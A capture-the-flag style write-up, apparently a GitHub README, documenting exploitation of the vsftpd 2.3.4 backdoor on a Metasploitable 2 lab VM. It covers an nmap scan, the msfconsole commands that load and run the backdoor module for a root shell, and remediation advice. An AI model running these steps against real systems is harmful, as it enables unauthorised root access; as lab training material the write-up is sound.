# Metasploitable-2-CTF--Writeup

## 🎯 Target Info

- **Machine:** Metasploitable 2
- **IP:** `192.168.56.104`
- **Service:** vsftpd 2.3.4 (vulnerable)

## 🧩 Recon

```bash
nmap -sV 192.168.56.104
```

## Findings:

Port 21: vsftpd 2.3.4
Known backdoor exists.

## 🚀 Exploitation Steps:
1️⃣ Fire up Metasploit

```bash
msfconsole
```

2️⃣ Search for the module

```bash
search vsftpd
```

3️⃣ Use the exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.104
run
```



## 📁 Proof

<img width="1920" height="936" alt="VirtualBox_Parrot OS Security Edition_16_07_2025_23_28_09" src="https://github.com/user-attachments/assets/8de2072b-e333-40b5-a22d-05f18ff9be45" />
Running the nmap scan to identify open services on Metasploitable2. Found vsftpd 2.3.4 running on port 21 — our entry point!

<img width="1920" height="936" alt="VirtualBox_Parrot OS Security Edition_16_07_2025_23_27_14" src="https://github.com/user-attachments/assets/91819b2f-1a41-4fbf-a62d-f80ca0fab538" />
Launching the vsftpd 2.3.4 backdoor exploit using msfconsole. Successful — gained root shell on the target!

<img width="1920" height="936" alt="VirtualBox_Parrot OS Security Edition_16_07_2025_23_24_50" src="https://github.com/user-attachments/assets/c9b627ac-1a19-40a0-97ec-d295f1e78930" />
Validating the access — whoami confirms root privileges. Listing /root shows the directories, but no proof.txt flag exists by default on Metasploitable2.



## 🔒 Remediation
- Remove/upgrade vsftpd 2.3.4

- Switch to SFTP

- Use firewall rules for access control

- Enable logging & intrusion detection

- Keep services updated


